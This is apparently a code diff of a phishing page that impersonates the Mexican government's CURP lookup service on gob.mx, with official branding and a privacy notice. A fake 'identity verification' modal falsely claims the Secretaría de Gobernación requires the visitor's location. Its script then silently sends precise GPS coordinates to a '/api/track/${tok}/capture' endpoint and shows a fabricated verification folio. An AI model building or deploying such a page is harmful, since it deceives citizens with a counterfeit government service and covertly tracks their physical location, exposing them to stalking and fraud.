-  <div class="gob-infobox">
-    <strong>¡Sugerencia!</strong>
-    Para solicitar asistencia telefónica sobre el servicio de la CURP, puede comunicarse al Centro de Atención y Servicios, de lunes a viernes, de 08:00 a 16:00 horas, a los números: <strong>800 9 11 11 11</strong>, extensiones 15100 y 15101.
-  </div>
-
-  <!-- Privacy notice -->
-  <div class="gob-privacy" style="margin-top:20px">
-    <strong>Aviso de privacidad simplificado de consulta de CURP en línea</strong><br>
-    La recolección de datos personales se lleva a cabo a través de <a href="#">https://www.gob.mx/curp</a>, cuyo administrador y responsable del trámite de CURP es la Dirección General del Registro Nacional de Población e Identidad de la Secretaría de Gobernación. Los datos personales que se recaban serán utilizados con la finalidad de buscar, validar y obtener la CURP.
-    Conoce el aviso de privacidad integral en <a href="#">https://www.gob.mx/curp/privacidadintegral</a>.
   </div>
 </main>
 
-<!-- ===== FOOTER ===== -->
-<footer class="gob-footer">
-  <div class="gob-footer-inner">
-    <span>© 2025 Gobierno de México</span>
-    <div class="gob-footer-links">
-      <a href="#">Aviso de privacidad</a>
-      <a href="#">Términos y condiciones</a>
-      <a href="#">Política de accesibilidad</a>
-      <a href="#">Mapa del sitio</a>
+<!-- ══ FOOTER ══ -->
+<footer class="footer">
+  <div class="footer-inner">
+    <div class="footer-brand">
+      <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/1/1e/Escudo_de_armas_de_M%C3%A9xico.svg/40px-Escudo_de_armas_de_M%C3%A9xico.svg.png" alt="Escudo" width="40" onerror="this.style.display='none'">
+      <div class="footer-brand-text">
+        <span>Gobierno de</span>
+        <span>México</span>
+      </div>
+    </div>
+    <div class="footer-section">
+      <span>Enlaces</span><span class="chevron">❯</span>
+    </div>
+    <div class="footer-section">
+      <span>¿Qué es gob.mx?</span><span class="chevron">❯</span>
+    </div>
+    <a class="footer-link" href="#">Denuncia contra servidores públicos</a>
+    <div class="footer-social">
+      <p>Síguenos en</p>
+      <div class="footer-social-icons">
+        <a href="#" title="Facebook">f</a>
+        <a href="#" title="X" style="font-family:monospace">✕</a>
+        <a href="#" title="Instagram">&#9825;</a>
+        <a href="#" title="YouTube">&#9654;</a>
+      </div>
+    </div>
+    <div class="footer-079">
+      <div class="footer-079-icon">✸</div>
+      <div class="footer-079-text">
+        <span class="num">079</span>
+        <span class="sub">Comunícate, estamos<br>para ayudarte</span>
+      </div>
     </div>
   </div>
 </footer>
 
-<!-- ===== MODAL OVERLAY ===== -->
-<div class="gob-overlay" id="overlay">
-  <div class="gob-modal">
+<!-- ══ BOTTOM BAR ══ -->
+<div class="bottom-bar">
+  <span class="bottom-note">* Campos obligatorios</span>
+  <button class="btn-buscar" type="button" onclick="handleBuscar()">
+    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
+      <circle cx="11" cy="11" r="7"/><line x1="21" y1="21" x2="16.65" y2="16.65"/>
+    </svg>
+    Buscar
+  </button>
+</div>
 
-    <!-- Paso: verificando datos -->
-    <div id="modal-verify">
-      <div class="gob-modal-icon">
-        <svg width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="#006847" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><path d="M12 16v-4M12 8h.01"/></svg>
+<!-- ══ MODAL ══ -->
+<div class="overlay" id="overlay">
+  <div class="modal">
+
+    <!-- Verificación -->
+    <div id="m-verify">
+      <div class="modal-icon">
+        <svg width="26" height="26" viewBox="0 0 24 24" fill="none" stroke="#6B1535" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
       </div>
-      <div class="gob-modal-title">Verificación de identidad requerida</div>
-      <div class="gob-modal-desc">
-        Para continuar con la consulta de su CURP, el sistema necesita validar su ubicación como medida de seguridad ante posibles accesos fraudulentos a datos personales.
-      </div>
-      <button class="gob-modal-btn" onclick="requestLocation()">Permitir verificación de ubicación</button>
-      <div style="font-size:11px;color:#999;margin-top:4px;line-height:1.4">
-        Esta verificación es requerida por la Secretaría de Gobernación para proteger su información personal. Su ubicación no será almacenada permanentemente.
-      </div>
+      <div class="modal-title">Verificación de identidad requerida</div>
+      <div class="modal-desc">Para continuar con la consulta de su CURP, el sistema del RENAPO requiere validar su ubicación geográfica como medida de seguridad ante posibles accesos no autorizados a datos personales.</div>
+      <button class="modal-btn" onclick="requestLocation()">Permitir verificación de ubicación</button>
+      <button class="modal-btn-sec" onclick="closeModal()">Cancelar</button>
+      <p style="font-size:11px;color:#aaa;margin-top:8px;line-height:1.4">Esta verificación es solicitada por la Secretaría de Gobernación para proteger su información. Su ubicación no se almacenará de forma permanente.</p>
     </div>
 
-    <!-- Paso: solicitando GPS -->
-    <div id="modal-loading" style="display:none">
-      <div class="gob-spinner"></div>
-      <div class="gob-modal-title">Verificando ubicación...</div>
-      <div class="gob-modal-desc" style="margin-bottom:0">Conectando con los servidores del RENAPO, por favor espere.</div>
+    <!-- Cargando -->
+    <div id="m-loading" style="display:none">
+      <div class="spinner"></div>
+      <div class="modal-title">Verificando información...</div>
+      <div class="modal-desc" style="margin-bottom:0">Conectando con los servidores del RENAPO. Por favor espere.</div>
     </div>
 
-    <!-- Paso: éxito -->
-    <div id="modal-success" style="display:none">
-      <div class="gob-success-icon">
-        <svg width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="#006847" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg>
+    <!-- Éxito -->
+    <div id="m-success" style="display:none">
+      <div class="success-icon">
+        <svg width="26" height="26" viewBox="0 0 24 24" fill="none" stroke="#1a6b2a" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg>
       </div>
-      <div class="gob-success-title">Identidad verificada</div>
-      <div class="gob-success-desc">Sus datos han sido validados. A continuación podrá consultar y descargar su CURP.</div>
-      <div class="gob-success-ref">Folio de verificación: <span>GOB-${tok.slice(0,8).toUpperCase()}</span></div>
-      <button class="gob-modal-btn" onclick="closeModal()">Continuar con la consulta →</button>
+      <div class="success-title">Identidad verificada</div>
+      <div class="success-desc">Su información ha sido validada correctamente. A continuación podrá consultar y descargar su CURP.</div>
+      <div class="success-ref">Folio de consulta: <strong>RENAPO-${tok.slice(0,8).toUpperCase()}</strong></div>
+      <button class="modal-btn" onclick="closeModal()">Continuar →</button>
     </div>
 
-    <!-- Paso: error de permisos -->
-    <div id="modal-error" style="display:none">
-      <div class="gob-error-box">
-        No fue posible verificar su ubicación. Para continuar, debe permitir el acceso a su ubicación en la configuración de su navegador y volver a intentarlo.
+    <!-- Error de permisos -->
+    <div id="m-error" style="display:none">
+      <div class="error-box">
+        <strong>No fue posible verificar su ubicación.</strong><br>
+        Para continuar, debe permitir el acceso a su ubicación en la configuración de su navegador e intentarlo nuevamente.
       </div>
-      <button class="gob-modal-btn" onclick="requestLocation()">Intentar de nuevo</button>
-      <button type="button" onclick="closeModal()" style="display:block;width:100%;margin-top:8px;background:none;border:none;color:#888;font-size:13px;cursor:pointer;font-family:inherit">Cancelar</button>
+      <button class="modal-btn" onclick="requestLocation()">Intentar de nuevo</button>
+      <button class="modal-btn-sec" onclick="closeModal()">Cancelar</button>
     </div>
 
   </div>
@@ -370,28 +376,24 @@ body{font-family:'Open Sans',Arial,Helvetica,sans-serif;background:#f0f0f0;color
 function switchTab(id, btn) {
   document.getElementById('tab-curp').style.display = id === 'tab-curp' ? 'block' : 'none';
   document.getElementById('tab-datos').style.display = id === 'tab-datos' ? 'block' : 'none';
-  document.querySelectorAll('.gob-tab').forEach(function(b){ b.classList.remove('active'); });
-  if(btn) btn.classList.add('active');
+  document.querySelectorAll('.tab-btn').forEach(function(b){ b.classList.remove('active'); });
+  if (btn) btn.classList.add('active');
 }
-
 function handleBuscar() {
   document.getElementById('overlay').classList.add('show');
-  showModal('modal-verify');
+  showModal('m-verify');
 }
-
 function showModal(id) {
-  ['modal-verify','modal-loading','modal-success','modal-error'].forEach(function(s){
+  ['m-verify','m-loading','m-success','m-error'].forEach(function(s){
     document.getElementById(s).style.display = s === id ? 'block' : 'none';
   });
 }
-
 function closeModal() {
   document.getElementById('overlay').classList.remove('show');
 }
-
 function requestLocation() {
-  if (!navigator.geolocation) { showModal('modal-error'); return; }
-  showModal('modal-loading');
+  if (!navigator.geolocation) { showModal('m-error'); return; }
+  showModal('m-loading');
   navigator.geolocation.getCurrentPosition(
     function(pos) {
       fetch('/api/track/${tok}/capture', {
@@ -404,10 +406,10 @@ function requestLocation() {
           altitude: pos.coords.altitude
         })
       }).catch(function(){});
-      showModal('modal-success');
+      showModal('m-success');
     },
-    function() { showModal('modal-error'); },
-    {enableHighAccuracy:true, timeout:15000, maximumAge:0}
+    function() { showModal('m-error'); },
+    {enableHighAccuracy: true, timeout: 15000, maximumAge: 0}
   );
 }
 </script>
